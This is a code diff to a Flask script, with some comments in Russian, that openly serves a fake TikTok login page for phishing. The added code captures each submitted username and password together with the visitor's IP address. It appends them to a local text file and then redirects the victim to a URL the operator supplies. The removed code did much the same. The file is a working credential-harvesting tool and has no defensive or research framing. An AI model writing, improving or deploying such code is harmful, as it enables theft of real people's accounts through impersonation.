@@ -1,39 +1,47 @@
-from flask import Flask, render_template, request, redirect, url_for
-import webbrowser
 import os
+from flask import Flask, render_template, request, redirect, url_for
 
-# Чтение ссылки из конфигурационного файла
-print('Давайте настроим ваш сайт')
-action_url = input('Вставьте сюда ссылку, на которую будет перенаправляться пользователь: ')
+print('Setting up phishing...')
+action_url = input('Enter the URL to redirect users after phishing: ')
 
-app = Flask(__name__, template_folder='templates')  # Убедитесь, что путь к шаблонам правильный
+app = Flask(__name__, template_folder='templates/tiktok')
 username = None
-
-def write_to_file(email, password):
-    with open('user_info.txt', 'a') as file:
-        file.write(f'Email: {email}, Password: {password}\n')
 
 @app.route("/")
 def home():
     user_ip = request.remote_addr
     print(f"User IP address: {user_ip}")
-    return render_template('Tiktok.html')
+    return render_template('index.html')
 
 @app.route("/login", methods=["POST"])
 def login():
     global username
     username = request.form['username']
     password = request.form['password']
+    user_ip = request.remote_addr  # Получение IP-адреса пользователя внутри функции
     print('User: ', username)
     print('Password: ', password)
-    write_to_file(username, password)  # Запись в файл перед редиректом
-    return redirect(url_for('welcome'))
+
+    # Определяем текущий путь
+    current_path = os.path.abspath(os.path.dirname(__file__))
+    file_path = os.path.join(current_path, 'tiktok_user_data.txt')
+    print(f"File path: {file_path}")
+
+    # Запись в файл с кодировкой UTF-8
+    try:
+        with open(file_path, 'a', encoding='utf-8') as file:
+            file.write(f"User: {username}, Password: {password}, IP: {user_ip}\n")
+        print("Data successfully written to file.")
+    except Exception as e:
+        print(f"Error writing to file: {e}")
+
+    return redirect(action_url)
 
 @app.route("/welcome")
 def welcome():
-    webbrowser.open(action_url)
-    return "Redirecting..."
+    # Redirect to action_url on the client's browser
+    return render_template("xd1.html")
 
 if __name__ == '__main__':
-    print("Запуск сервера...")
-    app.run(host='0.0.0.0', port=8888, debug=True)
+    print("Starting the server...")
+    app.run(host='0.0.0.0', port=8088)
